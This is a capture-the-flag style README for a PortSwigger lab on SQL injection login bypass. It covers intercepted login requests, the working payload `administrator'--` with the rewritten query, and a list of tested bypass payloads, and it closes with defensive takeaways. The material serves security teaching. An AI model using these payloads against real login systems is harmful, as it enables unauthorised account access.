# SQL Injection Login Bypass Lab 🛡️

> **Lab:** SQL injection vulnerability allowing login bypass  
> **Platform:** [PortSwigger Web Security Academy](https://portswigger.net/web-security)  
> **Difficulty:** Apprentice  
> **Status:** ✅ Solved

---

## 📌 Lab Description

This lab contains a SQL injection vulnerability in the login function. The application uses user-supplied input directly in a SQL query without proper sanitization, allowing an attacker to bypass authentication and log in as the `administrator` user.

---

## 🎯 Objective

- Bypass the login form
- Log in as the `administrator` user
- Access the admin panel / account page

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercepting & modifying HTTP requests |
| **Firefox (Kali Linux)** | Browser for testing |
| **Python + Requests** | Automated exploitation script |

---

## 🔍 Step-by-Step Walkthrough

### Step 1: Identify the Vulnerable Endpoint

Navigate to the lab URL and click **"My account"** to access the login page.

```
GET /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### Step 2: Intercept the Login Request

1. Open **Burp Suite** and turn on **Intercept**
2. Enter any credentials in the login form (e.g., `test:test`)
3. Capture the POST request:

```http
POST /login HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

### Step 3: Test for SQL Injection

Send the request to **Repeater** and test payloads in the `username` field.

#### Payload Used:
```
administrator'--
```

**Explanation:**
- `administrator` → targets the admin account
- `'` → closes the original string quote
- `--` → comments out the rest of the query (including password check)

The resulting SQL query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```

Which the database interprets as:
```sql
SELECT * FROM users WHERE username = 'administrator'
```

The password check is completely bypassed! 🔓

### Step 4: Successful Login

With the payload in the `username` field and any random password, the server responds with a **302 Redirect** to `/my-account`, confirming successful authentication as `administrator`.

---

## 🖼️ Screenshots

| Step | Description | File |
|------|-------------|------|
| 1 | Lab Homepage | `screenshots/01-lab-homepage.png` |
| 2 | Burp Suite Intercept | `screenshots/02-burp-intercept.png` |
| 3 | Repeater with Payload | `screenshots/03-repeater-payload.png` |
| 4 | Login Bypass Success | `screenshots/04-login-success.png` |
| 5 | Admin Account Page | `screenshots/05-admin-account.png` |

> **Note:** Add your own screenshots to the `screenshots/` folder.

---

## 🐍 Automated Exploit (Python)

A Python script is included to automate the exploitation:

```bash
python exploit.py --url "https://<lab-id>.web-security-academy.net"
```

### Features:
- Automatically detects the login endpoint
- Injects the bypass payload
- Confirms successful authentication
- Displays the response headers & redirect location

---

## 📁 Repository Structure

```
sqli-login-bypass-lab/
├── README.md                 # This file
├── exploit.py                # Automated exploit script
├── requirements.txt          # Python dependencies
├── payloads/
│   └── login_bypass.txt      # List of tested payloads
└── screenshots/
    ├── 01-lab-homepage.png
    ├── 02-burp-intercept.png
    ├── 03-repeater-payload.png
    ├── 04-login-success.png
    └── 05-admin-account.png
```

---

## 💉 Payloads Tested

```
administrator'--
administrator' OR '1'='1'--
' OR '1'='1'--
' OR 1=1--
admin'--
```

**Working Payload:** `administrator'--`

---

## 🧠 Key Takeaways

1. **Never trust user input** — always sanitize and parameterize queries
2. **Use Prepared Statements** — the best defense against SQLi
3. **Input Validation** — whitelist expected characters/formats
4. **Least Privilege** — database accounts should have minimal permissions
5. **WAFs help, but aren't enough** — defense in depth is critical

---

## 🔗 References

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

## ⚠️ Disclaimer

> This repository is for **educational purposes only**. The techniques demonstrated here should only be used on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

---

**Author:** Swoyon  
**Date Solved:** 2026-08-15
